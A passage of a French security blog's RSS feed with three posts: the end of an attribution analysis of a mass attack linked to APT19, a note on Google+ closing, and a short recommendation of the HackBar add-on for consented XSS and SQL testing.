+<p>Cette adresse web est codée en dur dans un composant additionnel de surveillance téléchargé par le dropper. Ce qui laisse supposer qu&rsquo;il s&rsquo;agisse là de l&rsquo;adresse du serveur de Contrôle et de Commande qui lui serait basé en Chine. De plus, l&rsquo;extension « asp » conforte l&rsquo;hypothèse d&rsquo;un contrôle Web sur le botnet.</p>
+<p>On remarquera par ailleurs le nom du sous-domaine en « 2019 ». En faisant quelques recherches j&rsquo;ai constaté que chaque opération avait son sous-domaine en fonction de l&rsquo;année. Le plus vieux que j&rsquo;ai pu trouver remontant à 2017.</p>
+<h3>Verdict </h3>
+<p>Même si rien ne nous permet de dire qu&rsquo;il s&rsquo;agisse bien là d&rsquo;une attaque orchestrée par des pirates russes, il est évident que la plupart des infrastructures supportant l&rsquo;opération se trouvent, elles, en Russie. </p>
+<p>Le point intriguant dans tout ceci c&rsquo;est que le plus gros bénéfice de l&rsquo;opération se trouve en Chine et comme par hasard un serveur vital de l&rsquo;opération se trouve être lui aussi en Chine. </p>
+<p>Ce point est d&rsquo;autant plus intriguant lorsque l&rsquo;on sait que le domaine serait attribué à <a href="https://attack.mitre.org/groups/G0073/">APT 19</a>. Aussi connue sous le doux nom de « Codoso Team » ou encore « Sunshop Group ». Il s&rsquo;agirait d&rsquo;un groupe de hackers indépendants qui bénéficieraient d&rsquo;une certaine forme d&rsquo;appui de la part du gouvernement chinois (<a href="https://www.fireeye.fr/current-threats/apt-groups.html#apt19">source</a>) </p>
+<p>En bref, voilà où m&rsquo;a mené ma petite enquête pour en apprendre un peu plus sur ces pirates de l&rsquo;ombre qui font tant parler d&rsquo;eux, et sur qui, paradoxalement, on connait peu de choses. </p>
+<p>J&rsquo;espère que cet article vous a plu, n&rsquo;hésitez pas à m&rsquo;envoyer des messages via le formulaire de contact ou même en commentaire pour me donner votre point de vue, ou si vous avez connu la même situation / une situation similaire, je les lirais tous ! 🙂</p>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/fr/fun/dissection-dune-attaque-de-masse-chinoise/">Dissection d&rsquo;une attaque de masse chinoise</a> appeared first on <a rel="nofollow" href="https://tchernobyl.altervista.org">~# Hackonch !</a>.</p>
+]]></content:encoded>
+										</item>
+		<item>
+		<title>Google+ le début de la fin ?</title>
+		<link>https://hackonch.ml/fr/web/google-le-debut-de-la-fin/</link>
+				<pubDate>Thu, 06 Dec 2018 00:34:59 +0000</pubDate>
+		<dc:creator><![CDATA[~# Hackonch !]]></dc:creator>
+				<category><![CDATA[Web]]></category>
+
+		<guid isPermaLink="false">https://tchernobyl.ml/?p=451</guid>
+				<description><![CDATA[<div class="post-excerpt">Dans une note passé inaperçu (ou presque&#8230;) Google annonce officiellement abandonner « Google+ ». Pour ceux qui comme moi habitent dans une grotte Google+ c&#8217;est un clone&#160;râté&#160;de facebook lancé par Google en&#8230;</div>
+<div class="post-more"><a href="https://hackonch.ml/fr/web/google-le-debut-de-la-fin/" class="btn btn-primary btn-effect"><span>Lire l&#039;Article</span><span><i class="icon icon-arrow-right"></i></span></a></div>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/fr/web/google-le-debut-de-la-fin/">Google+ le début de la fin ?</a> appeared first on <a rel="nofollow" href="https://tchernobyl.altervista.org">~# Hackonch !</a>.</p>
+]]></description>
+								<content:encoded><![CDATA[
+<p class="has-drop-cap">Dans une note passé inaperçu (ou presque&#8230;) Google annonce officiellement abandonner « Google+ ». </p>
+
+
+
+<p>Pour ceux qui comme moi habitent dans une grotte Google+ c&rsquo;est un clone&nbsp;<del>râté</del>&nbsp;de facebook lancé par Google en 2011. Contrairement à ces concurrents le réseau social n&rsquo;a jamais vraiment décollé. </p>
+
+
+
+<p>On se souviendra par ailleurs des nombreux cartons que c&rsquo;était pris Google, dans la tronche, en essayant de donner un petit coup de pouce.&nbsp; La fois où par exemple quand chaque compte YouTube s&rsquo;est mystérieusement transformé en compte Google+&#8230;brrr&#8230; nous vivions des heures si sombres à l&rsquo;époque&nbsp;😰.&nbsp;</p>
+
+
+
+<p>Même si le service avait dépassé il y a quelque mois le milliard d&rsquo;utilisateur, c&rsquo;était sans compter sur les associations avec les comptes Gmail et les *trop* nombreux coups de pouce de la maison mère. </p>
+
+
+
+<p>Ainsi Google tente de justifier la fermeture de Google+ par ces quelques raisons:</p>
+
+
+
+<ul><li>Un « bug » corrigé en mars 2018 aurait compromis les données de 500 000 utilisateurs Google+ (mais aucune preuve selon Google)</li></ul>
+
+
+
+<ul><li>90% des sessions utilisateurs durent moins de 5 secondes (ouille ça doit faire mal, surtout quand on sait que Google+ a coûté&#8230;)&nbsp;</li></ul>
+
+
+
+<ul><li>585 millions de dollars et que&#8230;</li><li>Google+ ne rapporte « que » 185 millions de dollars</li><li></li></ul>
+
+
+
+<p>C&rsquo;est ainsi que Google+ mettra 7 *longs* mois à s&rsquo;éteindre et même après cette longue agonie, certains services continueront quand même à fonctionner pour les « entreprises » afin de faciliter les échanges via hangout par exemple.&nbsp;</p>
+
+
+
+<p>En bref, Google a enfin appris a lâcher prise ou comme diront certains: </p>
+
+
+
+<blockquote class="wp-block-quote"><p>Google a enfin compris que ça sert à rien de forcer, si ça veut pas, ça veut pas&nbsp;</p><cite>Un utilisateur lambda, 2018</cite></blockquote>
+
+
+
+<p class="has-text-color has-vivid-cyan-blue-color"><strong><a href="https://www.blog.google/technology/safety-security/project-strobe/">+d&rsquo;infos ici</a></strong></p>
+
+
+
+<p class="has-text-color has-vivid-cyan-blue-color">@tchernobyl</p>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/fr/web/google-le-debut-de-la-fin/">Google+ le début de la fin ?</a> appeared first on <a rel="nofollow" href="https://tchernobyl.altervista.org">~# Hackonch !</a>.</p>
+]]></content:encoded>
+										</item>
+		<item>
+		<title>HackBar ou le meilleur ami du pentester</title>
+		<link>https://hackonch.ml/fr/web/hackbar-ou-le-meilleur-ami-du-pentester/</link>
+				<pubDate>Thu, 01 Nov 2018 01:03:43 +0000</pubDate>
+		<dc:creator><![CDATA[~# Hackonch !]]></dc:creator>
+				<category><![CDATA[Web]]></category>
+
+		<guid isPermaLink="false">https://tchernobyl.ml/?p=171</guid>
+				<description><![CDATA[<div class="post-excerpt">Ouh là je vois déjà arriver les hordes de Jean-hacker avec leur grands chevaux et dire: « mais @tchernobyl je réalise tout les jours des « audits d&#8217;intrusion » et je n&#8217;ai jamais&#8230;</div>
+<div class="post-more"><a href="https://hackonch.ml/fr/web/hackbar-ou-le-meilleur-ami-du-pentester/" class="btn btn-primary btn-effect"><span>Lire l&#039;Article</span><span><i class="icon icon-arrow-right"></i></span></a></div>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/fr/web/hackbar-ou-le-meilleur-ami-du-pentester/">HackBar ou le meilleur ami du pentester</a> appeared first on <a rel="nofollow" href="https://tchernobyl.altervista.org">~# Hackonch !</a>.</p>
+]]></description>
+								<content:encoded><![CDATA[
+<p>Ouh là je vois déjà arriver les hordes de Jean-hacker avec leur grands chevaux et dire:</p>
+
+
+
+<blockquote class="wp-block-quote"><p>« mais @tchernobyl je réalise tout les jours des « audits d&rsquo;intrusion » et je n&rsquo;ai jamais entendu parlé de Hackbar ! »&nbsp;</p></blockquote>
+
+
+
+<p>Allons, mes braves laissez moi argumenter!&nbsp;</p>
+
+
+
+<p>Bon d&rsquo;abord pour ce qui ne savent pas, Hackbar c&rsquo;est un petit add-on <a href="https://addons.mozilla.org/en-US/firefox/addon/quantum-hackbar/?src=search">Firefox</a> (ou <a href="https://chrome.google.com/webstore/detail/hackbar/ejljggkpbkchhfcplgpaegmbfhenekdc">Chrome</a>) qui permet d&rsquo;avoir&#8230;une barre o/. </p>
+
+
+
+<p>Mais attention, pas n&rsquo;importe quelle barre, une barre spéciale&#8230;une barre pour les gouverner tous !</p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter"><img src="https://addons.cdn.mozilla.net/user-media/previews/full/197/197833.png?modified=1530209574" alt="" /></figure></div>
+
+
+
+<p>Plus sérieusement, il est très utile à tout ceux qui souhaitent très rapidement vérifier la présence d&rsquo;une faille XSS ou même SQL sur leur site (ou avec l&rsquo;accord de l&rsquo;admin bien sûr). Même si, ça fait très kikoo d&rsquo;utiliser un add-on pour ça, je dois reconnaître qu&rsquo;il est assez riche en options. Il m&rsquo;a d&rsquo;ailleurs permis de gagner beaucoup de temps lors de CTF par exemple. </p>
+
+
+
+<p>Après bien sûr des outils un peu plus adaptés existent mais pour un simple add-on je suis très satisfait.</p>
+
+
+
+<p></p>
+
+
+
+<p class="has-text-color has-vivid-cyan-blue-color">@tchernobyl</p>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/fr/web/hackbar-ou-le-meilleur-ami-du-pentester/">HackBar ou le meilleur ami du pentester</a> appeared first on <a rel="nofollow" href="https://tchernobyl.altervista.org">~# Hackonch !</a>.</p>
+]]></content:encoded>
+										</item>
+	</channel>
+</rss>
